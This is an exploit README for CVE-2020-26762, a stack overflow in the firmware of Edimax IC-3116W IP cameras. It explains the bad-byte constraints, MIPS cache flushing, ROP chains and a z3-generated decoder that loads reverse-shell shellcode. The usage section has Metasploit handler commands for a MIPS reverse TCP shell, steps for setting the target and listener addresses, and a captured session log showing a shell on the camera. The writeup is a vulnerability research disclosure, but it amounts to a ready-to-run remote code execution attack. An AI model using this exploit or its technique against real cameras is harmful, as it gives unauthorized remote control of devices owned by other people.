# Exploit for CVE-2020-26762

Early 2020 I reported a stack-based buffer overflow to Edimax that exists in Edimax IP-camera firmware images and affects version 3.06 (for IC-3116W) and version 3.07 (IC-3140W). The vulnerability has been introduced due to a security fix for CVE-2018-8072. The following exploit works for IC-3116W firmware v3.06. The actual exploit can be found in `exploit.py`. `poc.py` can be used for both versions to verify/trigger the bug.

The exploit uses a dynamic encoder to encode the payload in such a way it can be sent through the GET query and get injected into the target. Once the GET request is sent, the payload decodes itself in memory and uses multiple chains to force the camera to open a reverse shell to the ip address and port specified in `exploit.py`.

For those who want to understand the exploit in depth, read the exploit description right below.

<b>Please note:</b> The exploit is only provided for educational purposes. Please do not harm any system that is not owned by you.

# 1 Exploit description

When looking at the exploit code, one might ask: How the hell can exploitation of a classic buffer overflow be that complex, despite the lack of stack cookies and no DEP. To clarify on that, I will present the challenges I encountered and how I solved them in the following.

Among bypassing ASLR - which luckily only affects the stack segment here - the major problems that made exploitation hard, can be traced back to the underlying CPU architecture (cache incoherency) and especially the amount of bad bytes due to the web server implementation.

First of all, some information about the camera system itself. The embedded processor is a realtek CPU with MIPS (big endian) instruction set. The entire firmware effectively is a rlx linux and runs busybox, which is a small software suite or combination of common UNIX utilities (cat, ftp access,..) and often seen in IoT devices. Besides that, there is of course also a lighttpd webserver deamon running for the webinterface of the camera. 

## 1.1 Bad characters (webserver, lighttpd)

As mentioned in the introduction, the payload is injected into the camera system using the GET parameter. To be more specific, the query part in the url. According to RFC3986 (Uniform Resource Identifier), the following bytes are reserved and can therefore not be used in the payload: `:`(0x3A), `\`(0x2F), `?`(0x3F), `#`(0x23). Additionally, lighttpd (v1.4) throws a `Bad Request 400` error in case the query string contains any bytes in range 0x00 to 0x20:
```c
if( http_header_strict  ?  (∗cur >= 0 && ∗cur < 32) : ∗cur =='\0') {
    if( srv−>srvconf . log_request_header_on_error )  {
        log_error_write ( srv , __FILE__, __LINE__,"sds", "invalid char in header",  (int)∗cur ,"-> 400") ;
    }
    goto failure;
}
break;
```
When looking at the MIPS instruction encoding, there are only a few OP codes left that can be used in the payload:

- LB - Load byte
- LW - Load word
- SB - Store byte
- SW - Store word
- ORI - Bitwise or immediate
- XORI - Bitwise exclusive or immediate
- ADDI - Add immediate (with overflow)
- ANDI - Bitwise and immediate
- ADDIU - Add immediate unsigned (no overflow)
- .. and few more useless instructions

No calls, systemcalls or jumps.

## 1.2 MIPS cache incoherency

For performance reasons, MIPS architectures maintain a separate cache for data (d-cache) and instructions (i-cache). While this e.g. speeds up memory access and thus provides benefits for the overall architecture, it becomes a very annoying feature when dealing with (self-modifying) shellcode. 

Why is this a problem? Since our payload is located on the stack after successful injection, from the perspective of the caches the exploit code is then located in the data cache and not in the instruction cache. So when the control flow is now hijacked and continues execution on the stack, the cpu would try to execute whatever is in the instruction cache at the same address, which then leads to undefined behaviour. Also, this often leads to confusion when testing the exploit using gdb, because gdb for some reason does not really distinguish between separate caches and the exploit first seems to work fine.

To address this issue, a cache flush is needed. The cache flush forces the cpu to write-back the actual changes from caches to the memory and also clears the caches. Next time the cpu tries to execute code from the stack, the i-cache access will result in a miss (since the cache has been flushed before) and load the shellcode from the memory that has been written back before. In the exploit community it is well-known to use/call blocking functions like `sleep()` to name one. `sleep()` forces the cpu to flush the caches. For more details read [1].

## 1.3 Exploitation

The following subsections describe the methodology of the exploit.

#### 1.3.0 The plan

Since ASLR is only partially active for the stack segment, the plan is to use rop gadgets in libuClibc to hijack the control-flow and execute a reverse shellcode that connects to a listener. 

At the time the stack overflows, there are only 1024 controllable bytes of the actual payload located on the stack which `$sp` points to. However, due to the nature of how cgi handles requests, the query string containing the whole payload is still located somewhere on the stack, because it was passed to the binary in form of env variables. Luckily, the pointer to the payload is stored in a global variable/static address. The goal is to use the first 1024 bytes to make `$sp` point to that static location and continue execution from there. Once the location is reached (`$sp` contains value of static address), a 0x2000 byte chunk gets allocated using `malloc`. By using `strncpy`, the decoder located within the payload is being copied into the previously allocated heap chunk. Next, the instruction pointer is set to the address on the heap chunk and thus starts execution of the decoding process. Due to the wide range of bad bytes, the decoder only consists of `andi`, `sw`, `addiu` and `xori` instructions that are used to write the actual shellcode right below the location of the decoder itself (within the same heap chunk). That way, once the decoder is finished, the execution of the shellcode starts right after decoding. Again, before executing the decoded shellcode, the caches need to be flushed, because the decoders modifications on the heap only took place in the data but not instruction cache.

#### 1.3.1 The Shellcode `def build_shellcode()`
The shellcode itself consists of two parts, a fork loop and a simple reverse shell taken from exploit db [2].

<b>Reverse shell</b>

The reverse shell used in this exploit is a classic one and therefore nothing special: First a socket is created using the `socket()` syscall, followed by `connect()` to establish a connection to the listener. Next, the file descriptors are duplicated (stdin, out err) using `dup2`. Finally, `execve()` is called to execute `/bin/bash`.

<b>Fork n loop</b>

Without going into too much detail, the `execve` call would force the webserver (parent) to kill the process in which the overflow occured. This is because the webserver forks itself for each incoming request and keeps track of the childs. The parent (webserver) notices the execve call and kills the child immediately, such that the reverse shell is being killed before the connection can be fully established. (For further details read the execve manpage.) To bypass these side effects, the child process needs to be forked and kept alive. 
```
    addiu   $s1, $zero, −1
loop: 
    li      $a0, 9999     # <−−−−−−+
    li      $v0, 4166     #    |   |
    syscall ( nanosleep ) #    |   |
    bgtz    $s1, loop     #−−−−+   |
    li      $s1, 4141     #        |
    li      $v0, 4002     #        |
    syscall  ( fork )     #        |
    bgtz    $v0, loop     # if parent: jump
```
Now when the code above gets executed, the new child, which exists as a result of the fork, then subsequently executes the shellcode while the parent stays within the endless loop. The idea of forking the process while keeping the child in an endless loop has been taken from here [3].

<b>Note</b>: The webservers child process will never return from the endless loop, which means the webserver is not able to answer requests anymore, until the process gets killed. This can either be achieved by killing the process, once the shell connection is established, or by restarting the camera.

#### 1.3.2 Building a decoder `def create_decoder(shellcode)`

The decoder is the core of the exploit and without that part, it won't be possible to get the shellcode injected into the target system. 

<b>High-level overview</b>

The following represents a visualization of the heap chunk already containing the decoder. The decoder calculates and writes the shellcode underneath the sleep call. 

```
malloc'd heap chunk: 
        +----------------------------+
        |                            |
        |          Decoder           |------+
        |                            |      |
        |----------------------------|      |
        |        jalr sleep()        |      |
        |----------------------------|      | decode and write shellcode
        |                            |      | right below the decoder
        |      Decoded Shellcode     | <----+
        |   +--------------------+   |      
        |   |    fork + loop     |   |
        |   |                    |   |
        |   |   reverse shell    |   |
        |   |                    |   |
        |   +--------------------+   |
        +----------------------------+
```

To do so, the shellcode is calculated byte-wise and written into the heap chunk by using the store word (`sw`) instruction. The `sleep()` call makes sure the caches are flushed and the shellcode can be executed.

<b>Decoder construction</b>

The decoder code will be generated at runtime by the exploit script (see `def create_decoder`). As mentioned before, the only op codes needed to decode the shellcode are `andi`, `sw`, `addiu` and `xori`. Decoding in this specific case means calculating the shellcode byte-per-byte and arrange them next to each other by writing them into the heap chunk. `create_decoder` works as follows:

For each byte of the shellcode 7-8 instructions are needed. With 4 bytes per (each) instruction, the payload length grows up to eight times larger, which is not optimal but works in this case. First, register `$a0` is set to zero using two `andi` instructions.

```python
decoder += b'\x30\x84\x55\x55' # andi $a0 $a0 0x5555
decoder += b'\x30\x84\xaa\xaa' # andi $a0 $a0 0xaaaa
```

Then the next byte is taken from the plain shellcode which has been described earlier.

```python
# extract next byte from shellcode
word = int.from_bytes(shellcode[i:i+1], byteorder='big')
```

Depending on the byte being a bad byte or not, it is either inserted into a `addiu` instruction template 

```python
if shellcode[i] not in BAD_BYTES:
    decoder+=(b'\x24\x84\x33'+word.to_bytes(1, byteorder='big')) # ADDIu $a0, $a0, val1
```

or must be replaced by a bitwise XOR operation such that the calculation results in the shellcode byte. To solve this, z3 is used to find two 2-byte values so that `val1` XOR `val2` = `shellcode_byte`. To perform the XOR, `addiu` is used again to move the first value to `$a0` (which is zero before the add operation), followed by the `xori` operation.

```python
else:
    # solve val1^val2 = word
    xor_vals = semantic_XOR_imm(word)

    val1 = xor_vals[0].to_bytes(2, byteorder='big')
    val2 = xor_vals[1].to_bytes(2, byteorder='big')

    # $a0 = byte of shellcode
    decoder+=(b'\x24\x84'+val1) # ADDIu $a0, $a0, a0 = val1
    decoder+=(b'\x38\x84'+val2) # XORI $a0, $a0,  a0 = val1 ^ val2 = word
```

Once `$a0` is loaded with the decoded shellcode byte, store word (`sw`) writes the result into the heap. `$s7` contains the address of the allocated heap chunk and is increased by one:

```python
# next move calculated byte into memory
# [$s7+0x2525] = word (word = part of shellcode)
decoder+=b'\xa2\xe4\x25\x25' # sw $a0 0x2525 $s7

# inc pointer; $s7 = $s7+1
decoder+=b'\x26\xF7\x44\xc1' # ADDIU $s7 $s7 17601
decoder+=b'\x26\xF7\xbb\x40' # ADDIU $s7 $s7 -17600
```

#### 1.3.3 Chains / ROP gadgets

Used ROP gadgets can be found in [gadgets.md](gadgets.md). (Recommended to take a look at)

<b>ROP chain #1</b>

As described before, when the payload overflows the 1024 byte stack buffer, only ~127 bytes (See [vuln.md](vuln.md) for more detailed information on that) can be used to hijack control flow and make the stack pointer point to the full payload. The whole payload is stored somewhere on the stack (quick reminder: ASLR), because the GET-parameter is passed via environment variables. 

```
low address   Stack Segment
            +--------------+
            |     ...      |
            | +----------+ | <- env variables == GET query == whole payload
            | | injected | | 
            | |  payload | |
            | +----------+ |
            |     ...      |
            |     ...      |
            +--------------+ <- 1024 byte buffer start
            | +----------+ | <- first 127 bytes of the payload copied into the buffer 
            | | chunk #1 | |
            | +----------+ |
            |     ...      |
            | +----------+ |
            | | ........ | |
            | +----------+ |
            |     ...      |
            | +----------+ |
            | | chunk #8 | |
            | +----------+ |
            +--------------+ <- 1024 byte buffer end
            | +----------+ | <- chunk #9 overwrites return address to hijack control flow
            | | overfl.  | | <- overflowing chunk that contains ROP chain#1 gadgets.
            | | chunk    | | <- makes sp poitining to "injected payload" above
            | +----------+ |
            +--------------+
high address

127 byte chunks in 1024byte buffer. 1024/127 = 8 chunks needed to overflow the buffer.
```

`doGetSystemInfo()` copies the first 9 chunks into the 1024 byte buffer and overwrites the return address. Using ROP gadgets, `$sp` is modified such that it points to the injected payload. The pointer containing the address pointing to the payload is stored in a static global variable. Using the second gadget(ROP2), this address (0x43bbe8) can be calculated, dereferenced to get the pointer (ROP4) and moved into `$sp`. `$sp` then points to the rest of the payload.

<b>ROP chain #2 and #3</b>

Now that `$sp` points to the beginning of the whole payload, ROP chain #2 is used to calculate a `jalr` instruction. Chain #3 then copies the instruction inbetween the decoder and (prospective) shellcode. As described in 1.3.2 this step is necessary to flush the caches after decoding the shellcode in the heap.


```
stack 
        +----------------------------+ <- $sp
        |         ROP Chain 2        |------+
        |----------------------------|      |
        |         ROP Chain 3        |      |
        |----------------------------|      |
        |         ROP Chain 4        |      |
        |----------------------------|      |
        |          Decoder           |      | write jalr instruction bytes between decoder and shellcode 
        |----------------------------|      |
        |        jalr sleep()        | <----+
        +----------------------------+
```
Furthermore ROP chain #3 calculates the size (0x2000) parameter for `malloc`.

<b>ROP chain #4</b>

Lastly, ROP chain #4 allocates a heap chunk using `malloc(0x2000)`. After that, `strcpy()` is used to write the decoder + `jalr` instruction into the heap, followed by a `sleep` call to flush the caches. Now that the caches are flushed, the instruction pointer is set to the heap address. The decoder then starts execution and thus writes the shellcode underneath the `jalr`.

```
heap
        +----------------------------+ <- instruction pointer
        |          Decoder           | -----+
        |----------------------------|      |
        |        jalr sleep()        |      | 
        |----------------------------|      | write shellcode below jalr instruction
        |                            |      | 
        |      Decoded Shellcode     | <----+
        |   +--------------------+   |      
        |   |    fork + loop     |   |
        |   |                    |   |
        |   |   reverse shell    |   |
        |   |                    |   |
        |   +--------------------+   |
        +----------------------------+
```

Once the decoder is finished, sleep gets called again due to the `jalr` patch to flush the caches one more time. Finally, the shellcode gets executed and connects to the specified listener.


# 2 Dependencies 
## 2.1 Ubuntu
Install python3, pip and z3

`sudo apt install python3 pip && pip install z3-solver`

# 3 Usage
### 3.1.1 Specify listener and target

In `exploit.py` change lines 37-40.
- `CAMERA_IP`: camera ip
- `CAMERA_PORT` : camera port
- `L_IP`: listener ip
- `L_PORT`: listener port

### 3.1.2 Start listener
Start a listener using the `L_PORT` and `L_IP` specified in `exploit.py` in step 3.1.1. 

Terminal 1: run metasploit
```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD linux/mipsbe/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST <your ip>
msf exploit(multi/handler) > set LPORT <port>
msf exploit(multi/handler) > set ExitOnSession false
msf exploit(multi/handler) > exploit −j
```

Terminal 2: run the exploit:

```bash
$ python3 exploit.py
[+] Open socket
[+] Connecting to 192.168.178.23
[+] Sending payload..
```

In case of success, `type sessions -i 1`
```bash
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 192.168.178.30:31337 
[*] Command shell session 1 opened (192.168.178.30:31337 -> 192.168.178.23:41796) at 2021-04-10 14:13:52 +0200
sessions -i 1
[*] Starting interaction with 1...

date
Sat Apr 10 12:15:45 UTC 2021
ls -la
drwxrwxr-x    2 1000     1000           96 Mar 29  2019 .
drwxrwxr-x    8 1000     1000          165 Mar 29  2019 ..
lrwxrwxrwx    1 1000     1000           14 Mar 29  2019 anonymous.cgi -> /bin/ipcam_cgi
lrwxrwxrwx    1 1000     1000           14 Mar 29  2019 getSysteminfo.cgi -> /bin/ipcam_cgi
lrwxrwxrwx    1 1000     1000           14 Mar 29  2019 supportiPhoneAppVersion.cgi -> /bin/ipcam_cgi
``` 
to bring the session to the fore and start interacting with the shell by entering commands.

Note that there won't be any command prompt.

As described in the writeup, the cameras webserver will hang after forking. To prevent this execute:

```bash
ps
...
16643 admin     1128 R    /www/camera-cgi/public/getSysteminfo.cgi 
16657 admin     1136 R    //bin/sh 
16835 admin      984 S    wget http://127.0.0.1:80/camera-cgi/private/updateSys
16836 admin     1056 S    /www/camera-cgi/private/updateSysteminfo.cgi 
...
18219 admin     1136 R    ps 
kill 16643
```

# References 
- [1] https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm
- [2] https://www.exploit-db.com/exploits/18226
- [3] https://www.exploit-db.com/docs/english/36806-developing-mips-exploits-to-hack-routers.pdf